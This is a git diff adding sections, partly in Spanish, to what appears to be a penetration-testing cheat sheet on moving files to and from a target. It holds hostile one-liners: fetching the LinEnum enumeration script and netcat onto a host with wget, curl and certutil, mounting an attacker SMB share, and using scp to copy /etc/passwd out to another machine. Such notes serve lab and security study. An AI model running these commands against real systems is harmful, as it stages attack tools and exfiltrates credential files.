@@ -14,5 +14,29 @@ copy \\192.168.220.133\share\nc.exe (windows)
 
 ```python
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test (Linux)
-net use n: \\192.168.220.133\share /user:test test (windows)
+net use n: \\192.168.220.133\share\FILENAME /user:test test (windows)
+```
+
+### Web Download
+
+```python
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+
+### Alternativas distintas
+```python
+python3 -m http.server
+python2.7 -m SimpleHTTPServer
+wget 192.168.49.128:8000/filetotransfer.txt
+```
+
+### SCP Upload
+```python
+scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+```
+
+### Certuil Tranferir archivos
+```python
+certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe (windows)
 ```
